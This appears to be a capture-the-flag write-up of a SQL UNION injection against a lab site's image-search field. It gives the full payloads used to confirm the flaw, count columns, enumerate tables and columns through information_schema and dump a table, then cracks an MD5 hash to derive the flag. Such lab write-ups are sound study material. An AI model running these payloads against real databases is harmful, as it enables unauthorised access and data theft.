# SQL UNION ATTACK
A union attack attempts to pull information from an additional table that is not the current table that is being queried.

### Step 1
> * Input is data search using ID's, try tentative search with integer and then without

### Step 2
> * Confirm SQL vulnerabitlity with 1 = 1 or 1, this one however does not return error messages

### Step 3
> * Attack
> 1. Confirm number off return columns and data types
 > * trial and error:  
> _1 = 1 or 1 ORDER BY 1_...  
> _UNION SELECT ‘a’,NULL_...
>
> 2. Find tables within current database  
 >_1 or 1 = 1 UNION SELECT 1,concat(table_name) FROM information_schema.tables WHERE table_schema = database()_  
> **list_images**
>
>3. Find columns within desired table  
 >_1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_schema = database()_  
>**id,url,title,comment**
>4. Find data  
 >_1 and 1=2 union select 1,concat(id,url,title,comment) from list_images_  
 <br>**5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46**  
 <br>_MD5 DECRYPT-> 1928e8083cf461a51303633093573c46 => albatroz_  
 <br> _toLower -> albatroz => albatroz_  
 <br>_Sh256 ENCRYPT -> albatroz => **f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188**_  

* https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635
